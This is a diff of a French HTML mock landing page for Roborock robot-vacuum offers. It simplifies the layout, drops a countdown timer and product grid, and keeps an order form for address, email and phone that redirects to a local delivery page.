@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roborock - Offres Exclusives</title>
+    <title>Roborock - Offres exclusives</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
-        /* Reset */
+        /* Réinitialisation */
         * {
             margin: 0;
             padding: 0;
@@ -17,7 +17,7 @@
             font-family: 'Montserrat', sans-serif;
         }
 
-        /* Global Styles */
+        /* Styles généraux */
         body {
             background-color: #f5f5f5;
             color: #333;
@@ -31,7 +31,7 @@
             list-style: none;
         }
 
-        /* Header */
+        /* En-tête de la page */
         header {
             background-color: #2c3e50;
             color: #fff;
@@ -105,7 +105,7 @@
             margin-left: 5px;
         }
 
-        /* Hero Section */
+        /* Section héros */
         .hero {
             background-image: linear-gradient(to right, #2980b9, #6dd5fa, #ffffff);
             color: #fff;
@@ -113,109 +113,29 @@
             padding: 100px 40px;
         }
         .hero h1 {
-            font-size: 4rem;
-            margin-bottom: 30px;
-            animation: fadeIn 1s ease-in;
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 20px;
         }
         .hero p {
-            font-size: 1.8rem;
+            font-size: 24px;
             margin-bottom: 40px;
-            animation: fadeIn 1.5s ease-in;
         }
-        .hero .countdown {
-            font-size: 2.5rem;
-            background: rgba(255, 255, 255, 0.2);
+        .hero .order-btn {
             display: inline-block;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-weight: 600;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
-        }
-
-        /* Products Section */
-        .products {
-            text-align: center;
-            margin: 80px auto;
-            max-width: 1200px;
-        }
-        .products h2 {
-            font-size: 3rem;
-            color: #2c3e50;
-            margin-bottom: 30px;
-        }
-        .products .product-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 40px;
-            margin-top: 40px;
-        }
-        .products .product {
-            background-color: #fff;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            transition: all 0.3s;
-        }
-        .products .product:hover {
-            transform: translateY(-10px);
-            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
-        }
-        .products .product img {
-            width: 100%;
-            height: 250px;
-            object-fit: cover;
-        }
-        .products .product-info {
-            padding: 30px;
-        }
-        .products .product-info h3 {
-            font-size: 1.8rem;
-            margin-bottom: 15px;
-        }
-        .products .product-info p {
-            font-size: 1.4rem;
-            color: #666;
-        }
-        .products .product-info .price {
-            font-size: 2.2rem;
-            font-weight: 600;
-            color: #e67e22;
-            margin-top: 15px;
-        }
-        .products .product-info .order-btn {
             background-color: #e67e22;
             color: #fff;
-            padding: 10px 20px;
-            border: none;
+            padding: 12px 24px;
             border-radius: 4px;
-            cursor: pointer;
-            margin-top: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.3s;
         }
-        .products .product-info .order-btn:hover {
-            background-color: #c56b1c;
-        }
-
-        /* Footer */
-        footer {
-            background-color: #2c3e50;
-            color: #fff;
-            text-align: center;
-            padding: 30px;
-            margin-top: 50px;
-            font-size: 1.2rem;
-        }
-        footer .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        footer .footer-links {
-            margin-top: 10px;
-        }
-        footer .footer-links a {
-            margin: 0 10px;
+        .hero .order-btn:hover {
+            background-color: #c96b1e;
         }
 
-        /* Styles pour la modal de commande */
+        /* Fenêtre modale de commande */
         .modal {
             display: none;
             position: fixed;
@@ -227,7 +147,6 @@
             overflow: auto;
             background-color: rgba(0, 0, 0, 0.4);
         }
-
         .modal-content {
             background-color: #fefefe;
             margin: 15% auto;
@@ -235,175 +154,93 @@
             border: 1px solid #888;
             width: 30%;
         }
-
         .close {
             color: #aaa;
             float: right;
             font-size: 28px;
             font-weight: bold;
         }
-
         .close:hover,
         .close:focus {
             color: black;
             text-decoration: none;
             cursor: pointer;
         }
-
-        .form-group {
-            margin-bottom: 20px;
+        #orderForm {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-
-        .form-group label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .form-group input {
+        #orderForm input {
             width: 100%;
-            padding: 10px;
+            padding: 12px 20px;
+            margin: 8px 0;
+            display: inline-block;
             border: 1px solid #ccc;
             border-radius: 4px;
+            box-sizing: border-box;
         }
-
-        .btn {
+        #orderForm button {
             background-color: #e67e22;
-            color: #fff;
-            padding: 10px 20px;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
             border: none;
             border-radius: 4px;
             cursor: pointer;
+            width: 100%;
         }
-
-        .btn:hover {
-            background-color: #c56b1c;
-        }
-
-        /* Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        #orderForm button:hover {
+            background-color: #c96b1e;
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
     <header>
         <div class="header-content">
             <div class="logo">Roborock</div>
             <nav>
                 <ul>
-                    <li><a href="#hero">Accueil</a></li>
-                    <li><a href="#products">Produits</a></li>
-                    <li><a href="#offers">Offres</a></li>
-                    <li><a href="#contact">Contact</a></li>
+                    <li><a href="#">Accueil</a></li>
+                    <li><a href="#">Produits</a></li>
+                    <li><a href="#">Offres</a></li>
+                    <li><a href="#">Contact</a></li>
                 </ul>
             </nav>
             <div class="search-cart">
                 <div class="search">
-                    <input type="text" placeholder="Rechercher">
+                    <input type="text" placeholder="Rechercher...">
                     <button><i class="fas fa-search"></i></button>
                 </div>
-                <a href="#" class="cart">
+                <div class="cart">
                     <i class="fas fa-shopping-cart"></i>
-                    <span class="cart-count">0</span>
-                </a>
+                    <div class="cart-count">2</div>
+                </div>
             </div>
         </div>
     </header>
 
-    <!-- Hero Section -->
-    <section class="hero" id="hero">
-        <h1>Offres Exclusives</h1>
-        <p>Profitez de réductions jusqu'à <strong>50%</strong> pour célébrer la nouvelle année !</p>
-        <div id="countdown" class="countdown" aria-describedby="countdown-description">00:00:00</div>
-        <p id="countdown-description" class="sr-only">Compte à rebours jusqu'à la fin des offres.</p>
-    </section>
+    <div class="hero">
+        <h1>Offres exclusives Roborock</h1>
+        <p>Profitez des meilleures offres sur nos robots aspirateurs !</p>
+        <button class="order-btn">Acheter maintenant</button>
+    </div>
 
-    <!-- Products Section -->
-    <section class="products" id="products">
-        <h2>Nos Derniers Produits</h2>
-        <div class="product-grid">
-            <div class="product">
-                <img src="https://via.placeholder.com/300x250" alt="Produit 1">
-                <div class="product-info">
-                    <h3>Roborock S7 MaxV Ultra</h3>
-                    <p>Dernier robot aspirateur et laveur avec station de charge.</p>
-                    <div class="price">1299 €</div>
-                    <button class="order-btn">Acheter</button>
-                </div>
-            </div>
-            <div class="product">
-                <img src="https://via.placeholder.com/300x250" alt="Produit 2">
-                <div class="product-info">
-                    <h3>Roborock S7+</h3>
-                    <p>Robot aspirateur et laveur avec station de vidage automatique.</p>
-                    <div class="price">899 €</div>
-                    <button class="order-btn">Acheter</button>
-                </div>
-            </div>
-            <div class="product">
-                <img src="https://via.placeholder.com/300x250" alt="Produit 3">
-                <div class="product-info">
-                    <h3>Roborock S6 MaxV</h3>
-                    <p>Robot aspirateur et laveur avec caméra et détection des obstacles.</p>
-                    <div class="price">599 €</div>
-                    <button class="order-btn">Acheter</button>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Modal pour la commande -->
+    <!-- Fenêtre modale de commande -->
     <div id="orderModal" class="modal">
         <div class="modal-content">
             <span class="close">&times;</span>
-            <h2>Informations de livraison</h2>
             <form id="orderForm">
-                <div class="form-group">
-                    <label for="address">Adresse de livraison</label>
-                    <input type="text" id="address" name="address" required>
-                </div>
-                <div class="form-group">
-                    <label for="email">Email</label>
-                    <input type="email" id="email" name="email" required>
-                </div>
-                <div class="form-group">
-                    <label for="phone">Numéro de téléphone</label>
-                    <input type="tel" id="phone" name="phone" required>
-                </div>
-                <button type="submit" class="btn">Continuer</button>
+                <input type="text" id="address" placeholder="Adresse" required>
+                <input type="email" id="email" placeholder="E-mail" required>
+                <input type="tel" id="phone" placeholder="Téléphone" required>
+                <button type="submit">Passer la commande</button>
             </form>
         </div>
     </div>
 
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <p>&copy; 2024 Roborock. Tous droits réservés.</p>
-            <div class="footer-links">
-                <a href="#">Politique de confidentialité</a>
-                <a href="#">Conditions d'utilisation</a>
-            </div>
-        </div>
-    </footer>
-
     <script>
-        // Countdown Timer
-        const countdown = document.getElementById('countdown');
-        const targetDate = new Date(new Date().getTime() + 24 * 60 * 60 * 1000); // 24 hours
-
-        setInterval(() => {
-            const now = new Date();
-            const diff = targetDate - now;
-            const hours = String(Math.floor(diff / (1000 * 60 * 60))).padStart(2, '0');
-            const minutes = String(Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, '0');
-            const seconds = String(Math.floor((diff % (1000 * 60) / 1000))).padStart(2, '0');
-            countdown.textContent = `${hours}:${minutes}:${seconds}`;
-        }, 1000);
-
-        // Gestion de l'affichage de la modal de commande
+        // Gestion de l'affichage de la fenêtre modale
         const orderModal = document.getElementById("orderModal");
         const orderButtons = document.querySelectorAll(".order-btn");
         const closeModal = document.getElementsByClassName("close")[0];
@@ -425,24 +262,27 @@
         });
 
         // Gestion de la soumission du formulaire de commande
-const orderForm = document.getElementById("orderForm");
-orderForm.addEventListener("submit", (event) => {
-    event.preventDefault();
+        const orderForm = document.getElementById("orderForm");
+        orderForm.addEventListener("submit", (event) => {
+            event.preventDefault();
 
-    // Récupérer les informations du formulaire
-    const address = document.getElementById("address").value;
-    const email = document.getElementById("email").value;
-    const phone = document.getElementById("phone").value;
+            // Récupérer les informations du formulaire
+            const address = document.getElementById("address").value;
+            const email = document.getElementById("email").value;
+            const phone = document.getElementById("phone").value;
 
-    // Vérifier si tous les champs sont remplis
-    if (!address || !email || !phone) {
-        alert("Veuillez remplir tous les champs obligatoires.");
-        return;
-    }
+            // Vérifier si tous les champs sont remplis
+            if (!address || !email || !phone) {
+                alert("Veuillez remplir tous les champs obligatoires.");
+                return;
+            }
 
-    // Simuler le processus de paiement (dans un scénario réel, vous redirigeriez vers une page de paiement sécurisée)
-    alert("Merci pour votre commande ! Vous allez être redirigé vers la page de paiement.");
+            // Simuler le processus de paiement (dans un scénario réel, vous redirigeriez vers une page de paiement sécurisée)
+            alert("Merci pour votre commande ! Vous allez être redirigé vers la page de paiement.");
 
-    // Rediriger vers la page de paiement
-    window.location.href = "paiement.html";
-});
+            // Rediriger vers la page de livraison
+            window.location.href = "livraison.html";
+        });
+    </script>
+</body>
+</html>
